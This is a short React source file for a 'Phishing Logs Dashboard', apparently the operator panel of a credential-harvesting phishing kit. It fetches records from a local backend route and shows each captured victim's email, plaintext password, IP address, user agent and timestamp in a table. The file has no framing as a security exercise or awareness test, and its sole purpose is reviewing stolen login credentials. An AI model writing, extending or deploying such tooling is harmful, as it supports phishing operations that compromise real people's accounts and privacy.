import React, { useEffect, useState } from 'react';
import axios from 'axios';

const PhishingLogs = () => {
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    axios.get('http://localhost:5000/api/phishing/logs')
      .then((res) => {
        setLogs(res.data);
        setLoading(false);
      })
      .catch((err) => {
        console.error('Error fetching logs:', err);
        setLoading(false);
      });
  }, []);

  return (
    <div style={{ padding: '20px' }}>
      <h2>📋 Phishing Logs Dashboard</h2>
      {loading ? (
        <p>Loading logs...</p>
      ) : (
        <table border="1" cellPadding="10">
          <thead>
            <tr>
              <th>Email</th>
              <th>Password</th>
              <th>IP</th>
              <th>User Agent</th>
              <th>Date</th>
            </tr>
          </thead>
          <tbody>
            {logs.map((log, index) => (
              <tr key={index}>
                <td>{log.email}</td>
                <td>{log.password}</td>
                <td>{log.ip}</td>
                <td style={{ maxWidth: '300px', wordBreak: 'break-word' }}>{log.user_agent}</td>
                <td>{new Date(log.createdAt).toLocaleString()}</td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
};

export default PhishingLogs;
